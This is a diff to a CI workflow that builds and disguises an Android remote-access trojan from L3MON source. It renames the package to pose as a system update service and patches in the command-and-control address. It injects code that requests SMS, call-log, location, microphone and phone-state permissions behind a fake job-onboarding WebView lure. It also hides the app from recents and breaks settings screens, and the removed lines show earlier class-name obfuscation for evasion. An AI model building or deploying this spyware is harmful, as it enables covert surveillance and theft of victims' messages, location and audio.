@@ -24,16 +24,16 @@ jobs:
           wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
           wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O sign.jar
 
-      - name: Advanced Evasion & Obfuscation
+      - name: Stealth Patching & WebView Lure
         run: |
           OLD_PKG="com.etechd.l3mon"
           NEW_PKG="com.sys.update.svc"
           OLD_PATH="com/etechd/l3mon"
           NEW_PATH="com/sys/update/svc"
 
-          echo "Applying Deep Package and Class Obfuscation..."
+          echo "Applying Stealth Package Patching..."
           
-          # 1. Initial Package Rename
+          # 1. Package Rename (Stable)
           OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
           find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
           find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +
@@ -44,65 +44,69 @@ jobs:
             rm -rf "payload_source/smali/com/etechd"
           fi
 
-          # 2. Update patch_payload.sh BEFORE class renaming
-          # This ensures the patching script knows where to look
+          # 2. Update targetSdkVersion to 31 (Sweet spot for Android 14 bypass)
+          sed -i 's/targetSdkVersion: .*/targetSdkVersion: 31/g' payload_source/apktool.yml
+          sed -i 's/targetSdkVersion="[0-9]*"/targetSdkVersion="31"/g' payload_source/AndroidManifest.xml
+
+          # 3. Dynamic IP/Port Patching
           chmod +x patch_payload.sh
-          sed -i "s|$OLD_PATH/IOSocket.smali|$NEW_PATH/IOSocket.smali|g" patch_payload.sh
+          sed -i "s|payload_source/smali/$OLD_PATH/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
           ./patch_payload.sh
 
-          # 3. Deep Class Renaming (Scrambling Signature)
-          CLASSES=(
-            "MainActivity A"
-            "MainService S"
-            "ConnectionManager C"
-            "SMSManager Sm"
-            "LocManager L"
-            "ContactsManager Co"
-            "CallsManager Ca"
-            "FileManager F"
-            "PermissionManager P"
-            "IOSocket I"
-            "AppList Al"
-            "WifiScanner W"
-            "MicManager M"
-            "Payload Pl"
-            "ServiceReciever Sr"
-            "MyReceiver R"
-            "NotificationListener N"
-            "FalconAccessibilityService As"
-          )
+          # 4. Create WebView Lure Snippet
+          # This replaces the UI with the onboarding portal and requests permissions
+          cat > lure.smali <<LURE
+    # Request Permissions
+    const/4 v0, 0x7
+    new-array v0, v0, [Ljava/lang/String;
+    const/4 v1, 0x0
+    const-string v2, "android.permission.READ_SMS"
+    aput-object v2, v0, v1
+    const/4 v1, 0x1
+    const-string v2, "android.permission.RECEIVE_SMS"
+    aput-object v2, v0, v1
+    const/4 v1, 0x2
+    const-string v2, "android.permission.READ_CALL_LOG"
+    aput-object v2, v0, v1
+    const/4 v1, 0x3
+    const-string v2, "android.permission.ACCESS_FINE_LOCATION"
+    aput-object v2, v0, v1
+    const/4 v1, 0x4
+    const-string v2, "android.permission.RECORD_AUDIO"
+    aput-object v2, v0, v1
+    const/4 v1, 0x5
+    const-string v2, "android.permission.POST_NOTIFICATIONS"
+    aput-object v2, v0, v1
+    const/4 v1, 0x6
+    const-string v2, "android.permission.READ_PHONE_STATE"
+    aput-object v2, v0, v1
+    const/4 v1, 0x1
+    invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions([Ljava/lang/String;I)V
 
-          for item in "${CLASSES[@]}"; do
-            read -r OLD_NAME NEW_NAME <<< "$item"
-            echo "Renaming Class: $OLD_NAME -> $NEW_NAME"
-            
-            find payload_source -type f -name "*.smali" -exec sed -i "s|$NEW_PATH/$OLD_NAME|$NEW_PATH/$NEW_NAME|g" {} +
-            find payload_source -type f -exec sed -i "s|$NEW_PKG.$OLD_NAME|$NEW_PKG.$NEW_NAME|g" {} +
-            
-            if [ -f "payload_source/smali/$NEW_PATH/$OLD_NAME.smali" ]; then
-              mv "payload_source/smali/$NEW_PATH/$OLD_NAME.smali" "payload_source/smali/$NEW_PATH/$NEW_NAME.smali"
-            fi
-          done
+    # Initialize WebView Lure
+    new-instance v0, Landroid/webkit/WebView;
+    invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
+    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
+    move-result-object v1
+    const/4 v2, 0x1
+    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
+    const-string v1, "https://global-talent-onboarding-portal.vercel.app/"
+    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
+    invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(Landroid/view/View;)V
+LURE
 
-          # 4. Fix AndroidManifest.xml (Stealth Attributes)
-          sed -i "s/android:name=\"$NEW_PKG.A\"/android:name=\"$NEW_PKG.A\" android:excludeFromRecents=\"true\"/g" payload_source/AndroidManifest.xml
+          # Inject lure into MainActivity.smali (replacing the old setContentView)
+          # We search for the setContentView line and replace it with our lure
+          sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|r lure.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+          sed -i "s|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|# Original UI disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
-          # 5. Inject Runtime Permissions & Lure logic into A.smali
-          cp payload_source/permissions.smali.template permissions.smali
-          sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" permissions.smali
-          sed -i "s|MainActivity|A|g" permissions.smali
-          
-          cp payload_source/redirect.smali.template redirect.smali
-          sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" redirect.smali
-          sed -i "s|MainActivity|A|g" redirect.smali
+          # 5. Disable the "App Info" Loop
+          sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"/const-string v7, "unused"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
+          sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "unused"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
+          sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
-          sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/A;->setContentView(I)V|r permissions.smali" "payload_source/smali/$NEW_PATH/A.smali"
-          sed -i "\|invoke-virtual {p0, v0, v1}, L$NEW_PATH/A;->requestPermissions|r redirect.smali" "payload_source/smali/$NEW_PATH/A.smali"
-
-          # 6. Disable the "App Info" Loop
-          sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"/const-string v7, "unused"/g' "payload_source/smali/$NEW_PATH/A.smali"
-          sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "unused"/g' "payload_source/smali/$NEW_PATH/A.smali"
-          sed -i "s|invoke-virtual {p0}, L$NEW_PATH/A;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/A.smali"
+          # 6. Final Manifest Polish
+          sed -i 's/android:name="com.etechd.l3mon.MainActivity"/android:name="com.sys.update.svc.MainActivity" android:excludeFromRecents="true" android:configChanges="orientation|keyboardHidden|screenSize"/g' payload_source/AndroidManifest.xml
 
       - name: Build APK
         run: |
